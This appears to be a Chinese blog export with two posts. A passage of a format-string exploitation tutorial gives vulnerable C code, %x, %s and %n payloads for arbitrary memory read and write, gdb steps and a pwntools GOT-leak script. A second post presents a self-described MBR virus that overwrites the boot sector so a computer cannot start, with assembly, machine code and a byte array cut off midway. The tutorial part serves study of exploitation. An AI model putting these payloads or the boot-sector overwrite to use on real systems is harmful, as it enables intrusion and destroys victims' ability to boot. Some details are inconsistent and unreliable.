aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有的时候可能偷一下懒，这样写。这看起来是没有什么问题，程序也正常的打印出了字符串，但是由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。</p><p><strong>局部变量是储存在栈中的，所以一定可以找到输入的格式化字符串</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</p><p>输出为 <strong>AAAA</strong> 61fecc,77326c7f,870c8c,61fecc,77336d15,7738431c, <strong>41414141</strong> ,252c7825,78252c78,2c78252c,252c7825</p><p>41414141就是这个字符串开始的位置。通过不断的取变量操作，最终我们就能读取到程序的每一个位置。</p><h3 id="利用-n格式符（任意内存写入）"><a href="#利用-n格式符（任意内存写入）" class="headerlink" title="利用%n格式符（任意内存写入）"></a>利用%n格式符（任意内存写入）</h3><p>%n格式符的使用也是printf的漏洞产生原因之一，通过这个格式符可以通过printf实现访问栈内数据，甚至修改内存地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;int main(){    int a=123123123;    printf("a = %d\n", a);     //a的值    printf("%d%n\n", a, &amp;a);   //运用%n向内存中写入值    printf("a = %d\n", a);     //a的值}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果为</p><p>a = 123123123<br>123123123<br>a = 9</p><p>可以用构造的格式化字符串去访问栈内的数据,并且可以利用%n向内存中写入值。但是%n的作用只是将前面打印的字符串长度写入到内存中,而我们想要写入的是一个地址,而且这个地址是很大的。这时候我们就需要用到printf()函数的第三个特性来配合完成地址的写入</p><h3 id="自定义打印字符串宽度"><a href="#自定义打印字符串宽度" class="headerlink" title="自定义打印字符串宽度"></a>自定义打印字符串宽度</h3><p>printf的格式符还可以限定字符串的宽度，在格式符中间加上一个十进制整数来表示输出的最少位数，若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;int main(){ int a=123123123;  printf("a = %d\n", a); printf("%.100d%n\n", a, &amp;a); printf("a = %d\n", a);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果是</p><pre class="line-numbers language-none"><code class="language-none">a = 1231231230000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012312123100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以发现a值被改为了100。（有的编译器可能会自动禁止使用修改a的值，所以记得关掉内存保护机制）</p><p>比如说要把0x8048000这个地址写入内存，那么应该把把该地址对应的10进制134512640作为格式符控制宽度即可</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;int main(){ int a=123123123;  printf("a = %d\n", a); printf("%.134512640d%n\n", a, &amp;a); printf("a = %d\n", a);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="格式化字符串漏洞的检测"><a href="#格式化字符串漏洞的检测" class="headerlink" title="格式化字符串漏洞的检测"></a>格式化字符串漏洞的检测</h2><h3 id="产生的漏洞"><a href="#产生的漏洞" class="headerlink" title="产生的漏洞"></a>产生的漏洞</h3><p>1.任意内存位置的读取<br>2.任意内存位置的写入</p><h3 id="产生漏洞的基本原因"><a href="#产生漏洞的基本原因" class="headerlink" title="产生漏洞的基本原因"></a>产生漏洞的基本原因</h3><p>1.使用格式化字符串没有指定对应的格式符<br>2.格式符的个数和参数的个数不匹配<br>3.使用了%n改变了已存在的变量的值</p><h3 id="检测是否存在格式化字符串漏洞"><a href="#检测是否存在格式化字符串漏洞" class="headerlink" title="检测是否存在格式化字符串漏洞"></a>检测是否存在格式化字符串漏洞</h3><p>1.看printf函数的格式符是否正确指定，参数个数是否匹配<br>2.是否使用了%n来改变变量的值</p><h2 id="格式化字符串漏洞的利用"><a href="#格式化字符串漏洞的利用" class="headerlink" title="格式化字符串漏洞的利用"></a>格式化字符串漏洞的利用</h2><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>可以输入很多的%s,这是使程序崩溃最简单的方式，对于每个%s,printf都要从栈中取一个数字，把这个数视为地址，打印出这个地址指向的内存内容，直到出现NULL字符。</p><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>leakmemory.c</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;int main(){char s[100];int a=1,b=0x22222222,c=-1;scanf("%s",s);printf("%08x.%08x.%08x.%s\n",a,b,c,s); /*%08x.%08x.%08x.%08x.%08x表示函数printf()从栈中取出5个参数并将它们以8位十六进制数的形式显示出来*/printf(s);return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="依此获取栈的内存"><a href="#依此获取栈的内存" class="headerlink" title="依此获取栈的内存"></a>依此获取栈的内存</h5><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190117435.png"></p><p>输入 %08x.%08x.%08输出为  00000001.22222222.ffffffff.%08x.%08x.%08x<br>ffbe26a0,000000c2,f7e176bb</p><p>用gdb调试，运行程序，在printf处下断点（b.printf），运行程序（r）,之后就该输入了，输入 <strong>%08x.%08x.%08x</strong> 此时程序就断在printf处了。</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190158957.png"></p><p>栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值（1），第四个变量为b的值（0x22222222），第五个变量为c的值(-1)，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序输出</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190215238.png"></p><p>继续往下运行</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190235062.png"></p><p>格式化字符串为%x%x%x，所以，程序会将栈上的 0xffffcfe8及其之后的数值分别作为第一，第二，第三个参数按照int型进行解析，分别输出。继续运行，得到结果去，确实和想象中的一样。</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190253751.png"></p><h5 id="获取指定参数的值"><a href="#获取指定参数的值" class="headerlink" title="获取指定参数的值"></a>获取指定参数的值</h5><p>想要获取指定的某个参数，可以使用 <code>%n$x</code></p><p><strong>这里的n表示栈中格式字符串后面的第n个值,也就是第n+1个参数</strong></p><p>例如：获取第四个参数，还是在printf处下断点(b printf)，运行(r)，就到了要输入的地方了，输入%3$x，继续运行，得到f7e946bb就是第四个参数对应的值</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190321164.png"></p><h5 id="获取栈变量对应地址的内容"><a href="#获取栈变量对应地址的内容" class="headerlink" title="获取栈变量对应地址的内容"></a>获取栈变量对应地址的内容</h5><p>攻击者可以使用一个”显示指定地址的内存”的格式规范来查看任意地址的内存。例如，使用%s显示参数指针所指定的地址的内存，将它作为一个ASCII字符串处理，直到遇到一个空字符。如果攻击者能够操纵这个参数指针指向一个特定的地址，那么%s就会输出该位置的内存内容。</p><p>还是上面的程序，在prinf处下断点，输入%s之后继续运行</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190353584.png"></p><p>第二次执行printf函数的时候,将9xffffcfe4处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。但是不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1.利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。<br>2.利用 %s 来获取变量所对应地址的内容，只不过有零截断。<br>3.利用%n来获取指定参数对应地址的内容。</p><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>无论是泄露栈上连续的变量，还是泄露指定的变量值，都只能读取栈中已有的内容，怎样获取任意地址的内存呢？？？一般情况下，在格式化字符串漏洞中读取的格式化字符串都是在栈上的，所以在调用函数时，第一个参数的值就是格式化字符串的地址。如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第n个参数,就可以使用<code>addr%n$s</code></p><p>如何确定是第几个参数？？？<br>可以使用<code>[tag]%p</code>,重复某个字符的机器字长来作为 tag，而后面会跟上若干个 %p 来输出栈上的内容，如果内容与我们前面的 tag 重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址。</p><p>将A作为tag，输入AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190521588.png"></p><p>由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第5个参数，但是是格式化字符串的第4个参数</p><p>测试一下，输入<code>%4$s</code>查看一下，程序崩溃。</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190536743.png"></p><p>由上图可知第五个参数的地址是 <strong>0xffffcff0</strong>,调试一下，输入%4$s，说明格式化字符串所对应的值没有办法作为一个合法的地址被解析</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190555574.png"></p><p>那就设置一个可以访问的地址试一下，先看一下重定向表。有三个函数可以选择printf、libc_start_main、isoc99_scanf。</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190612221.png"></p><p>那就用__isoc99_scanf(0ffset为0804a014即”\x14\xa0\x04\x08”)</p><p>python2 -c ‘print(“\x14\xa0\x04\x08”+”%4$s”)’ &gt; text<br>gdb -qa.out</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921190700051.png"></p><p>由图可知第四个参数确实指向我们的scanf的地址。通过x/w指令得到__isoc99_scanf函数的虚拟地址0xf7e600c0,由于0x804a014处的内容是仍然一个指针，所以打印不成功</p><p>还可以利用pwntools构造payload找到__isoc99_scanf函数的地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./a.out'</span><span class="token punctuation">)</span>a <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./a.out'</span><span class="token punctuation">)</span>__isoc99_scanf_got <span class="token operator">=</span> a<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>__isoc99_scanf_got<span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>__isoc99_scanf_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%4$s'</span><span class="token keyword">print</span> payloadgdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'%4$s\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># remove the first bytes of __isoc99_scanf@got</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;int main(){int i;char str[]="Thriumph";printf("%s %n\n",str,&amp;i);printf("%d\n",i);return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-none"><code class="language-none">Thriumph9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>i赋值为6，在遇到转换指示符之前输入了9个字符（Thriumph和一个空格），没有长度修饰符是默认为int。通常情况下，我们要需要覆写的值是一个shellcode的地址，而这个地址往往是一 个很大的数字。这时我们就需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数。</p><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><pre class="line-numbers language-none"><code class="language-none">aa%k$nxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8，其实就可以覆盖了</p><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><pre class="line-numbers language-none"><code class="language-none">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mbr引导区</title>
      <link href="/2020/01/06/mbr%E5%BC%95%E5%AF%BC%E5%8C%BA/"/>
      <url>/2020/01/06/mbr%E5%BC%95%E5%AF%BC%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>一个简单的病毒(不能传播的假病毒)，通过改写mbr,达到不能开机的效果😬</p><h2 id="mbr"><a href="#mbr" class="headerlink" title="mbr"></a>mbr</h2><p>MBR是硬盘的主引导记录，也就是硬盘的0柱面、0磁头、1扇区称为主引导扇区。mbr占用512个字节(200h)，它用于硬盘启动时将系统控制权交给用户指定的,所以就是先于操作系统拿到控制权。</p><h2 id="病毒原理"><a href="#病毒原理" class="headerlink" title="病毒原理"></a>病毒原理</h2><p>1.准备要写入的mbr。<br>2.提升程序权限,调用CreateFile函数去打开物理驱动器的时候，必须具备调试权限，否则就会打开失败，打开失败我们就不能对mbr进行读取了。<br>3.写入mbr,这样就有拿到优先操作系统的控制权了。</p><h2 id="汇编源码"><a href="#汇编源码" class="headerlink" title="汇编源码"></a>汇编源码</h2><pre class="line-numbers language-none"><code class="language-none">assume cs:code code segmentstart:mov ax,12h           ;使用12号功能，对显示器进行设置    int 10h              ;显示器的设置mov bp, 7C18H        ;字符串的起始偏移mov cx, 13h          ;字符串长度mov ax,1301h         ;AH = 13h 调用功能号13 ,在teletype模式下显示字符串,AL = 01Hmov bx,0Ch           ;BH = 00H BL = 0CHmov dx,0h            ;起始的行列int 10hjmp $       ;无线循环，防止代码进入数据区code endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="获得机器码"><a href="#获得机器码" class="headerlink" title="获得机器码"></a>获得机器码</h2><p>B8 12 00 CD 10 BD 18 7C B9 13 00 B8 01 13 BB 0C 00 BA 00 00 CD 10 EB FE<br>之后将想要显示的字符串添加到后面<br>68 61 63 6B 20 62 79 20 54 68 72 69 75 6D 70 68<br>21 14<br>最后两个字节必须是55AA，因为55AA是MBR的结束标志</p><h2 id="编写mbr引导区病毒"><a href="#编写mbr引导区病毒" class="headerlink" title="编写mbr引导区病毒"></a>编写mbr引导区病毒</h2><p>主程序有两个函数，一个函数提权，一个函数写mbr</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;windows.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;winioctl.h&gt;</span></span><span class="token keyword">char</span> temp<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0xB8</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xCD</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0xBD</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x7C</span><span class="token punctuation">,</span><span class="token number">0xB9</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">0xB8</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0xBB</span><span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">0xCD</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0xE2</span><span class="token punctuation">,</span><span class="token number">0xFE</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token 